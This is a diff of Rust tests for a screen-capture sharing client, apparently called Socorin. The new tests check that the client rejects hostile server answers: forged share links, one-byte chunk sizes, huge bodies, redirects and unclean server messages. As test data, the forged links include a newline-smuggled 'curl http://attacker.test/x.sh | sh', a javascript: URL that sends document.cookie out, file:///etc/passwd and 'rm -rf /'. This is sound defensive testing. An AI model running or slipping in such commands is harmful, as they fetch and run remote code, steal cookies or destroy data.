             _ => json(200, serde_json::json!({})),
         });
@@ -1437,14 +1733,16 @@ pub(crate) mod tests {
         // init without a chunk size, then with a chunk count that does not fit.
         let base = serve(|req| match req.path.as_str() {
             "/api/upload/init" => json(201, serde_json::json!({ "uploadId": "u", "chunkBytes": 0, "totalChunks": 1, "uploadToken": "t" })),
-            _ => Fake::new(100, 1000).handle(req),
+            _ => Fake::new(TEST_CHUNK, 1000).handle(req),
         });
         point_at(&handle, &base);
         let e = run(upload(&handle, png(10), Kind::Image, "image/png", None)).unwrap_err();
-        assert!(e.message.contains("no chunk size"), "{}", e.message);
+        assert!(e.message.contains("asks for chunks of 0 bytes"), "{}", e.message);
         let base = serve(|req| match req.path.as_str() {
-            "/api/upload/init" => json(201, serde_json::json!({ "uploadId": "u", "chunkBytes": 100, "totalChunks": 7, "uploadToken": "t" })),
-            _ => Fake::new(100, 1000).handle(req),
+            "/api/upload/init" => {
+                json(201, serde_json::json!({ "uploadId": "u", "chunkBytes": TEST_CHUNK, "totalChunks": 7, "uploadToken": "t" }))
+            }
+            _ => Fake::new(TEST_CHUNK, 1000).handle(req),
         });
         point_at(&handle, &base);
         let e = run(upload(&handle, png(10), Kind::Image, "image/png", None)).unwrap_err();
@@ -1453,7 +1751,7 @@ pub(crate) mod tests {
 
     #[test]
     fn links_can_be_deleted_copied_and_are_capped_at_twenty() {
-        let fake = Fake::new(1000, 5000);
+        let fake = Fake::new(TEST_CHUNK, 5000);
         let base = serve_fake(&fake);
         let app = app_for(&base, "share-delete");
         let handle = app.handle().clone();
@@ -1474,7 +1772,7 @@ pub(crate) mod tests {
         let link = run(upload(&handle, png(10), Kind::Image, "image/png", None)).unwrap();
         run(delete(&handle, &link.id)).unwrap();
         let mut again = link.clone();
-        again.id = "med-0123456789abcdefgh".into();
+        again.id = MEDIA_ID.into();
         remember(&handle, &again);
         run(delete(&handle, &again.id)).unwrap();
         assert!(history(&handle).is_empty());
@@ -1501,15 +1799,18 @@ pub(crate) mod tests {
 
     #[test]
     fn share_png_copies_the_link_and_announces_it() {
-        let fake = Fake::new(1000, 5000);
+        let fake = Fake::new(TEST_CHUNK, 5000);
         let base = serve_fake(&fake);
         let app = app_for(&base, "share-announce");
         let handle = app.handle().clone();
         assert_eq!(notice(&handle), None);
 
         let result = run(share_png(&handle, png(10))).unwrap();
-        assert_eq!(result.share_url, "https://socorin.com/s/med-0123456789abcdefgh");
-        assert_eq!(result.delete_token.len(), 43);
+        assert_eq!(result.share_url, fake.share_url());
+        // What the page is handed carries no delete token (D-5).
+        let as_json = serde_json::to_value(&result).unwrap();
+        assert!(as_json.get("deleteToken").is_none(), "{as_json}");
+        assert_eq!(history(&handle)[0].delete_token.len(), 43, "Rust keeps it");
         assert_eq!(handle.state::<ShareState>().copied.lock().unwrap().as_slice(), &[result.share_url.clone()]);
         let Some(Notice::Shared { link, retention_days }) = notice(&handle) else { panic!() };
         assert_eq!(link.share_url, result.share_url);
@@ -1545,5 +1846,314 @@ pub(crate) mod tests {
         }
         assert!(matches!(notice(&handle), Some(Notice::Shared { .. })));
         dismiss(&handle);
+    }
+
+
+    // ---- what the client refuses to take from a server ----
+    //
+    // Everything below is a server (or a MITM on an `http://` address)
+    // answering the protocol correctly but with values chosen to hurt: the
+    // client's own bounds are what stops each one.
+
+    /// A share link is only a link when it is one, and only accepted when
+    /// it is on the server the capture went to.
+    #[test]
+    fn a_link_is_checked_before_it_is_believed() {
+        let server = "https://socorin.com";
+        assert!(valid_share_url(server, "https://socorin.com/s/abc"));
+        assert!(valid_share_url(server, "https://socorin.com/vi/s/abc?x=1#y"));
+        assert!(valid_share_url("http://localhost:3000", "http://localhost:3000/s/abc"));
+        for bad in [
+            // A newline turns one paste into two shell commands.
+            "https://socorin.com/s/abc\ncurl http://attacker.test/x.sh | sh",
+            "https://socorin.com/s/a b",
+            "https://socorin.com/s/a\tb",
+            "javascript:fetch('http://attacker.test')",
+            "file:///etc/passwd",
+            "data:text/html,<script>x</script>",
+            // Someone else's server, or the same name on another port.
+            "https://attacker.test/s/abc",
+            "https://socorin.com.attacker.test/s/abc",
+            "http://socorin.com/s/abc",
+            "https://socorin.com:8443/s/abc",
+            // Credentials in the URL, and nonsense.
+            "https://user:pw@socorin.com/s/abc",
+            "https://socorin.com@attacker.test/s/abc",
+            "not a url",
+            "",
+        ] {
+            assert!(!valid_share_url(server, bad), "{bad:?} should be refused");
+        }
+        assert!(!valid_share_url(server, &format!("https://socorin.com/s/{}", "x".repeat(MAX_SHARE_URL))));
+        // The looser check the history uses: any http(s) link, so a link
+        // made on a server that has since been changed stays deletable.
+        assert!(plausible_share_url("https://other.example/s/abc"));
+        assert!(!plausible_share_url("javascript:alert(1)"));
+        assert!(!plausible_share_url("https://socorin.com/s/a\nb"));
+    }
+
+    /// D-1: a server answering with a link of its own choosing gets
+    /// nowhere — nothing is copied and nothing is remembered.
+    #[test]
+    fn a_link_that_is_not_on_this_server_is_refused_and_never_copied() {
+        let handle_holder;
+        let evil = |url: &'static str| {
+            move |req: &Req| match req.path.as_str() {
+                "/api/upload/up-0123456789abcdefghij/complete" => json(
+                    201,
+                    serde_json::json!({
+                        "id": MEDIA_ID,
+                        "shareUrl": url,
+                        "deleteToken": "d".repeat(43),
+                        "expiresAt": "2099-11-17T00:00:00Z",
+                        "kind": "image",
+                        "mime": "image/png",
+                        "size": 10
+                    }),
+                ),
+                _ => Fake::new(TEST_CHUNK, 5000).handle(req),
+            }
+        };
+        let base = serve(evil("https://socorin.com/s/abc\ncurl -s http://attacker.test/x.sh | sh"));
+        let app = app_for(&base, "share-evil-url");
+        handle_holder = app.handle().clone();
+        let handle = &handle_holder;
+        let e = run(upload(handle, png(10), Kind::Image, "image/png", None)).unwrap_err();
+        assert_eq!(e.code, "invalid_response");
+        assert!(e.message.contains("a link that is not on"), "{}", e.message);
+        assert!(handle.state::<ShareState>().copied.lock().unwrap().is_empty(), "nothing reached the clipboard");
+        assert!(history(handle).is_empty(), "nothing was remembered");
+
+        for url in ["javascript:fetch('http://attacker.test/'+document.cookie)", "https://attacker.test/s/abc"] {
+            let base = serve(evil(url));
+            point_at(handle, &base);
+            let e = run(upload(handle, png(10), Kind::Image, "image/png", None)).unwrap_err();
+            assert_eq!(e.code, "invalid_response", "{url}");
+            assert!(handle.state::<ShareState>().copied.lock().unwrap().is_empty());
+        }
+    }
+
+    /// D-1 / history: lines the file should not hold are dropped as it is
+    /// read, and `prune_history` writes the tidied list back.
+    #[test]
+    fn the_history_drops_poisoned_and_expired_lines() {
+        let app = app_for("https://socorin.com", "share-history-filter");
+        let handle = app.handle().clone();
+        let line = |id: &str, url: &str, expires: &str| {
+            serde_json::json!({
+                "id": id,
+                "shareUrl": url,
+                "deleteToken": "d".repeat(43),
+                "expiresAt": expires,
+                "kind": "image",
+                "mime": "image/png",
+                "size": 10,
+                "createdAt": 1_700_000_000u64
+            })
+        };
+        let stored = serde_json::json!([
+            line("good", "https://socorin.com/s/good", "2099-01-01T00:00:00Z"),
+            // A link from a server that was configured earlier: still
+            // deletable, so it stays.
+            line("other-server", "https://other.example/s/x", "2099-01-01T00:00:00Z"),
+            // Written by a version that did not check, or edited by hand.
+            line("script", "javascript:alert(1)", "2099-01-01T00:00:00Z"),
+            line("newline", "https://socorin.com/s/a\nrm -rf /", "2099-01-01T00:00:00Z"),
+            // The server dropped this one long ago.
+            line("expired", "https://socorin.com/s/old", "2020-01-01T00:00:00Z"),
+            // A date nothing can read keeps its line.
+            line("odd-date", "https://socorin.com/s/odd", "whenever"),
+        ]);
+        let path = history_file(&handle).unwrap();
+        settings::write_atomically(&path, serde_json::to_string(&stored).unwrap().as_bytes()).unwrap();
+
+        let kept: Vec<String> = history(&handle).into_iter().map(|l| l.id).collect();
+        assert_eq!(kept, ["good", "other-server", "odd-date"]);
+        // An expired link cannot be copied or deleted either.
+        assert!(copy_link(&handle, "expired").is_err());
+        assert_eq!(run(delete(&handle, "script")).unwrap_err().code, "not_found");
+
+        // The file itself is tidied, so the delete tokens go with the lines.
+        prune_history(&handle);
+        let back = std::fs::read_to_string(&path).unwrap();
+        assert!(!back.contains("javascript:"), "{back}");
+        assert!(!back.contains("/s/old"), "{back}");
+        assert!(back.contains("/s/good"));
+        let before = back.len();
+        prune_history(&handle);
+        assert_eq!(std::fs::read_to_string(&path).unwrap().len(), before, "nothing left to prune");
+    }
+
+    #[test]
+    fn expiry_dates_are_read_when_they_can_be() {
+        assert_eq!(expires_at_secs("1970-01-01T00:00:10Z"), Some(10));
+        assert_eq!(expires_at_secs(" 2026-11-17T11:00:00.000Z "), Some(1_794_913_200));
+        assert_eq!(expires_at_secs("2026-11-17T11:00:00+01:00"), Some(1_794_909_600), "the zone is honoured");
+        assert_eq!(expires_at_secs("whenever"), None);
+        assert_eq!(expires_at_secs(""), None);
+        assert_eq!(expires_at_secs("1900-01-01T00:00:00Z"), None, "before the epoch");
+        assert!(expired("2020-01-01T00:00:00Z", now_secs()));
+        assert!(!expired("2099-01-01T00:00:00Z", now_secs()));
+        assert!(!expired("whenever", now_secs()), "an unreadable date keeps the line");
+    }
+
+    /// D-2: the server says how the upload is cut up, but only within the
+    /// bounds the client sets.
+    #[test]
+    fn the_server_cannot_choose_how_many_requests_an_upload_takes() {
+        let host = "socorin.com";
+        // A chunk size that would make one request per byte.
+        let e = chunk_count(host, 5_242_880, 1, 5_242_880).unwrap_err();
+        assert_eq!(e.code, "invalid_response");
+        assert!(e.message.contains("chunks of 1 bytes"), "{}", e.message);
+        assert!(chunk_count(host, 10, 0, 1).is_err(), "no chunk size at all");
+        assert!(chunk_count(host, 10, CHUNK_MIN - 1, 1).is_err());
+        assert!(chunk_count(host, 10, CHUNK_MAX + 1, 1).is_err());
+        // Within the bounds the count has to be the one the file makes —
+        // including when the server claims none at all (which used to skip
+        // the check).
+        assert_eq!(chunk_count(host, 10, CHUNK_MIN, 1).unwrap(), 1);
+        assert_eq!(chunk_count(host, 0, CHUNK_MIN, 1).unwrap(), 1, "an empty file is one chunk");
+        assert_eq!(chunk_count(host, CHUNK_MIN * 2, CHUNK_MIN, 2).unwrap(), 2);
+        let e = chunk_count(host, 10, CHUNK_MIN, 0).unwrap_err();
+        assert!(e.message.contains("expects 0 chunks"), "{}", e.message);
+        assert!(chunk_count(host, 10, CHUNK_MIN, 7).is_err());
+        // And never more requests than the client is prepared to make.
+        let huge = CHUNK_MIN * (MAX_CHUNKS + 1);
+        let e = chunk_count(host, huge, CHUNK_MIN, MAX_CHUNKS + 1).unwrap_err();
+        assert!(e.message.contains("at most 256"), "{}", e.message);
+    }
+
+    /// D-2, end to end: a server asking for one-byte chunks is turned down
+    /// before a single chunk is sent.
+    #[test]
+    fn a_tiny_chunk_size_is_refused_before_anything_is_uploaded() {
+        let puts = Arc::new(AtomicU32::new(0));
+        let counter = puts.clone();
+        let base = serve(move |req: &Req| {
+            if req.method == "PUT" {
+                counter.fetch_add(1, Ordering::SeqCst);
+            }
+            match req.path.as_str() {
+                "/api/upload/limits" => json(
+                    200,
+                    serde_json::json!({
+                        "maxFileBytes": 5_242_880u64,
+                        "chunkBytes": 1,
+                        "acceptedMimes": ["image/png"],
+                        "retentionDays": 60
+                    }),
+                ),
+                _ => Fake::new(TEST_CHUNK, 5_242_880).handle(req),
+            }
+        });
+        let app = app_for(&base, "share-tiny-chunks");
+        let e = run(upload(app.handle(), png(2000), Kind::Image, "image/png", None)).unwrap_err();
+        assert_eq!(e.code, "invalid_response");
+        assert!(e.message.contains("chunks of 1 bytes"), "{}", e.message);
+        assert_eq!(puts.load(Ordering::SeqCst), 0, "not one request was sent");
+    }
+
+    /// D-2: `maxFileBytes` is the server's, but the ceiling is the
+    /// client's, so a server cannot talk the app into reading a file of any
+    /// size into memory.
+    #[test]
+    fn the_size_ceiling_is_the_clients_too() {
+        let limits = |max| Limits {
+            max_file_bytes: max,
+            chunk_bytes: CHUNK_MIN,
+            accepted_mimes: vec!["image/png".into()],
+            retention_days: 60,
+        };
+        assert_eq!(limits(1000).effective_max(), 1000, "a smaller server limit wins");
+        assert_eq!(limits(u64::MAX).effective_max(), CLIENT_MAX_FILE);
+        assert_eq!(limits(100 * 1024 * 1024 * 1024).effective_max(), CLIENT_MAX_FILE);
+        let e = check(&limits(u64::MAX), "image/png", CLIENT_MAX_FILE + 1, "h").unwrap_err();
+        assert_eq!((e.code.as_str(), e.max_bytes), ("file_too_large", Some(CLIENT_MAX_FILE)));
+        assert_eq!(check(&limits(u64::MAX), "image/png", CLIENT_MAX_FILE, "h"), Ok(()));
+    }
+
+    /// D-3: a body far larger than any answer in this protocol is not read
+    /// into memory, whether it is announced or not.
+    #[test]
+    fn enormous_answers_are_not_swallowed() {
+        let big = 24 * 1024 * 1024usize;
+        // Announced by Content-Length, on a successful status.
+        let base = serve(move |_req: &Req| Resp {
+            status: 200,
+            headers: vec![("Content-Type".into(), "application/json".into())],
+            body: vec![b'A'; big],
+        });
+        let app = app_for(&base, "share-big-body");
+        let started = std::time::Instant::now();
+        let e = run(upload(app.handle(), png(10), Kind::Image, "image/png", None)).unwrap_err();
+        assert_eq!(e.code, "invalid_response");
+        assert!(e.message.contains("far more data"), "{}", e.message);
+        assert!(started.elapsed() < Duration::from_secs(20), "it gave up quickly");
+
+        // And on a failure, where the first bytes are all that is wanted.
+        let base = serve(move |_req: &Req| Resp { status: 500, headers: vec![], body: vec![b'B'; big] });
+        point_at(app.handle(), &base);
+        let e = run(upload(app.handle(), png(10), Kind::Image, "image/png", None)).unwrap_err();
+        assert_eq!((e.code.as_str(), e.status), ("server", Some(500)));
+    }
+
+    /// D-4: a redirect is a failure, not an instruction. The other origin
+    /// never hears from the app, so neither the install id nor the capture
+    /// travels to a host of the server's choosing.
+    #[test]
+    fn redirects_are_not_followed() {
+        let seen: Arc<Mutex<Vec<Req>>> = Arc::new(Mutex::new(Vec::new()));
+        let log = seen.clone();
+        let elsewhere = serve(move |req: &Req| {
+            log.lock().unwrap().push(req.clone());
+            json(200, serde_json::json!({}))
+        });
+        let target = format!("{elsewhere}/api/upload/init");
+        let base = serve(move |req: &Req| match req.path.as_str() {
+            "/api/upload/init" => Resp {
+                status: 307,
+                headers: vec![("Location".into(), target.clone())],
+                body: vec![],
+            },
+            _ => Fake::new(TEST_CHUNK, 5000).handle(req),
+        });
+        let app = app_for(&base, "share-redirect");
+        let e = run(upload(app.handle(), png(10), Kind::Image, "image/png", None)).unwrap_err();
+        assert_eq!((e.code.as_str(), e.status), ("server", Some(307)));
+        assert!(e.message.contains("redirected"), "{}", e.message);
+        assert!(!e.retryable(), "a redirect is not worth repeating");
+        assert!(seen.lock().unwrap().is_empty(), "the other origin heard nothing");
+    }
+
+    /// D-7: what the server says about itself is cleaned, cut and kept in
+    /// its own field, never pasted into Socorin's sentence.
+    #[test]
+    fn the_servers_own_words_are_cleaned_and_kept_apart() {
+        assert_eq!(server_message("abuse"), Some("abuse".into()));
+        assert_eq!(server_message("  two   words\n"), Some("two words".into()));
+        assert_eq!(server_message("one\nline\r\nnow"), Some("one line now".into()));
+        assert_eq!(server_message("\u{7}\u{1b}[31mred"), Some("[31mred".into()), "control characters go");
+        assert_eq!(server_message("   "), None);
+        assert_eq!(server_message(""), None);
+        let long = server_message(&"x".repeat(1000)).unwrap();
+        assert_eq!(long.chars().count(), MAX_SERVER_MESSAGE);
+
+        let body = format!(r#"{{"error":"blocked","message":"{}"}}"#, "y".repeat(5000));
+        let e = describe_failure("socorin.com", 403, None, body.as_bytes(), 1);
+        assert_eq!(e.message, "socorin.com refused this upload.", "our words stay ours");
+        assert_eq!(e.server_message.unwrap().chars().count(), MAX_SERVER_MESSAGE);
+        // It travels to the page in its own field.
+        let json = serde_json::to_value(describe_failure("h", 403, None, br#"{"message":"why"}"#, 1)).unwrap();
+        assert_eq!(json["serverMessage"], "why");
+        assert!(serde_json::to_value(ShareError::new("network", "x")).unwrap().get("serverMessage").is_none());
+    }
+
+    #[test]
+    fn sizes_are_named_in_a_unit_that_reads() {
+        assert_eq!(size_text(1), "1 bytes");
+        assert_eq!(size_text(CHUNK_MIN), "256 KB");
+        assert_eq!(size_text(CHUNK_MAX), "16 MB");
+        assert_eq!(size_text(1024 * 1024), "1 MB");
     }
 }
